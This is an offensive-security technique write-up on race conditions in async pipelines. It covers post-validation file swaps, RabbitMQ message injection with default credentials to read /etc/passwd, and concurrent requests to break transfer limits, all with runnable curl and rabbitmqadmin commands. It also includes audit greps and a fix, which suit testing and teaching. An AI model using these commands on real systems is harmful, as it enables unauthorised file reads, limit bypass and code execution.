---
category: technique
title: "Race Conditions in Async Pipelines - TOCTOU, Queue Injection, File Swap"
tags: [race-condition, toctou, async, queue, rabbitmq, celery, file-upload, background-worker, time-of-check-time-of-use]
---

# Race Conditions in Async Pipelines

Async pipelines create TOCTOU windows that don't exist in synchronous code. The validation runs in the HTTP request handler. The action runs in a background worker. Between those two moments, state can change.

The attacker controls the clock between check and use.

---

## The filesystem swap attack

**Pattern:** Upload handler validates file, stores at path, queues job. Worker reads file from path. The file at that path is not guaranteed to be the validated file.

**Attack sequence:**

1. Upload a valid file (passes all validation: MIME, extension, content, malware scan)
2. Note the storage path from the response or infer it from the pattern
3. Immediately overwrite the file at that path with a malicious payload:

```bash
# Time this to land between upload acknowledgment and worker pickup
curl -X POST /api/upload -F "file=@valid.pdf" &
UPLOAD_PID=$!

# As soon as you see the job ID in the response, overwrite
JOB_PATH="/data/uploads/$(id -u)/$(job_uuid).pdf"
cp malicious_payload.pdf "$JOB_PATH"
```

**Why it works:** The worker picks up the job message (which contains the file path) and reads the file by path — not by inode, not by a hash computed at upload time, not by a temporary atomic copy. The file has been replaced.

**What the worker opens:** your payload. The original validated file is gone.

**Escalation paths:**
- If worker calls Ghostscript: `%!PS` payload for command execution
- If worker calls ImageMagick: crafted image for CVE-exploit or SSRF via `@http://...`
- If worker calls pdftotext: path traversal in nested file references
- If worker stores parsed result in DB: stored XSS in extracted text fields

**Detection in source code:**

```bash
# Find background job consumers
grep -rn "@RabbitListener\|@app.task\|@celery.task\|MessageListener\|consume(" src/

# Check if worker re-validates or just reads path from message
# VULNERABLE pattern: direct file open from message field
grep -rn "getFilePath\|file_path\|filePath" src/workers/
# If followed by new File(path) or open(path) without re-checking ownership/hash: TOCTOU

# SAFE pattern: worker recomputes hash and compares to upload-time hash stored in DB
grep -rn "sha256\|md5\|hash\|checksum" src/workers/
```

---

## Queue message injection

If the message queue (RabbitMQ, Kafka, Redis streams, SQS) is accessible without authentication, you bypass the HTTP upload entirely:

```bash
# Check RabbitMQ with default credentials
curl -s -u guest:guest http://target.com:15672/api/queues
curl -s -u guest:guest http://target.com:5672/

# Publish a crafted job directly
rabbitmqadmin publish exchange=amq.default routing_key=job_queue \
  payload='{"job_id":"fake","file_path":"/etc/passwd","user_id":"1","patient_id":"1"}'
```

The worker processes `/etc/passwd` as if it were an uploaded file. Even without RCE, this is arbitrary file read through the worker's processing result.

**Check for in application.properties / .env:**
```bash
grep -rn "rabbitmq\|amqp\|redis.*queue\|sqs\|kafka" src/main/resources/ .env config/
grep -rn "spring.rabbitmq.password\|RABBITMQ_PASS\|MQ_PASSWORD" .
```

---

## Limit enforcement TOCTOU (daily/rate limits)

Read-check-write patterns for rate limits are races:

```
read: SELECT daily_total FROM limits WHERE user_id = ?  -> 4800
check: 4800 + 300 = 5100 > 5000 -> deny

# BUT: 10 concurrent requests all read 4800, all pass the check, all write 5100
```

**Test:**
```bash
for i in $(seq 1 20); do
  curl -s -X POST /api/transfers \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"amount": 4900}' &
done
wait
```

Expected if vulnerable: multiple transfers succeed, total exceeds the limit.

**Fix:** Atomic DB operations. `UPDATE limits SET daily_total = daily_total + ? WHERE user_id = ? AND daily_total + ? <= max_limit` — the check and update are one atomic operation. If it returns 0 rows affected, the limit was exceeded.

---

## Job message parameter trust

Any field in a job message that came from user input and is used by the worker without re-validation is a potential injection point:

- `file_path`: path traversal, symlink attacks
- `user_id`: privilege escalation if worker acts with different permissions
- `callback_url`: SSRF in webhook-style notifications
- `output_format`: command injection if passed to shell tools
- `patient_id`: IDOR if worker creates records without re-checking ownership

**Source code audit:**
```bash
# Find all fields read from job messages
grep -rn "message\.get\|job\['file\|deserialize\|from_json" src/workers/
# For each: trace to its use. Is it sanitized before use as a path/command/ID?
```
